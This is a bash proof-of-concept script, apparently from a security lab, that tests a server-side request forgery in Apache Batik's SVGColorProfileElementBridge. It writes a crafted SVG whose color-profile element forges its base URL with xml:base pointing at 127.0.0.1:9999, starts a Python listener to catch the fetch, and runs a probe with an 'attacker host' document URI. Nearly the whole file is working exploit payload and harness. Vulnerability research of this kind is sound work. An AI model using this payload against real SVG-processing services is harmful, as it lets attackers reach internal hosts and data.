#!/usr/bin/env bash
# Live-test P1: SSRF via xml:base-forged same-origin in SVGColorProfileElementBridge.
# color-profile element has xml:base=http://127.0.0.1:9999/ and a relative href; referenced via icc-color.
# If :9999 is hit, the same-host check (which uses the forgeable element base) was bypassed under DEFAULT security.
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
CP=$(printf '%s' "$W/batik-1.19/lib/*")

cat > cp.svg <<'SVG'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <color-profile name="myprof" xlink:href="profile.icc" xml:base="http://127.0.0.1:9999/"/>
  <rect width="20" height="20" fill="rgb(255,0,0) icc-color(myprof,1,0,0)"/>
</svg>
SVG

cat > srv9999.py <<'PY'
import http.server, socketserver, time, threading
HIT={"n":0}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        HIT["n"]+=1; print("PROFILE_HIT",self.path,flush=True)
        self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
def s():
    with socketserver.TCPServer(("127.0.0.1",9999),H) as srv: srv.serve_forever()
threading.Thread(target=s,daemon=True).start()
for _ in range(30):
    time.sleep(0.5)
    if HIT["n"]:
        print("RESULT: P1_CONFIRMED (color-profile xml:base SSRF reached internal :9999)",flush=True); break
else:
    print("RESULT: NO_HIT (color-profile did not fetch — not reached or blocked)",flush=True)
PY

python3 srv9999.py > /tmp/batik-lab/p1.result 2>&1 &
SRV=$!; sleep 1.2
echo "=== run BatikProbe (docURI set to attacker host so a real doc URL exists) ==="
timeout 40 java -cp "$CP:." BatikProbe /tmp/batik-lab/cp.svg http://198.51.100.7/evil.svg false 2>&1 | grep -E "TRANSCODE|Exception|Security" | head -6
sleep 3
echo "=== P1 result ==="; cat /tmp/batik-lab/p1.result 2>/dev/null | tail -4
kill $SRV 2>/dev/null; echo "=== DONE ==="
